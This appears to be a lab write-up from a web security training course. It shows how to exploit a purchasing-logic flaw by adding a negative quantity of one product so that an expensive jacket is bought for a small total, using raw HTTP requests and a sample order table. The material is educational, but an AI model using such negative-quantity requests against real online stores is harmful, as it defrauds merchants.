# Lab: High-level logic vulnerability
## Description
This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

## Solution
1. Add `1` item of the `Lightweight "l33t" Leather Jacket` to the cart
```yaml
POST /cart HTTP/1.1
Host: acd21fab1ed8c335c00b7f710032007a.web-security-academy.net
Cookie: session=yqY06p4NjfTKpDaTKGpvozPA4WWX69Mf
Content-Length: 36

productId=1&redir=PRODUCT&quantity=1
```

2. Add `-99` of another product to the cart

```yaml
POST /cart HTTP/1.1
Host: acd21fab1ed8c335c00b7f710032007a.web-security-academy.net
Cookie: session=yqY06p4NjfTKpDaTKGpvozPA4WWX69Mf
Content-Length: 35

productId=2&quantity=-99&redir=CART
```

The final cart should look something like this:
```
Your order is on its way!

Name								Price				Quantity	
Lightweight "l33t" Leather Jacket	$1337.00			8	
Safety First	$					91.82				-116	

Total:	$44.88
```
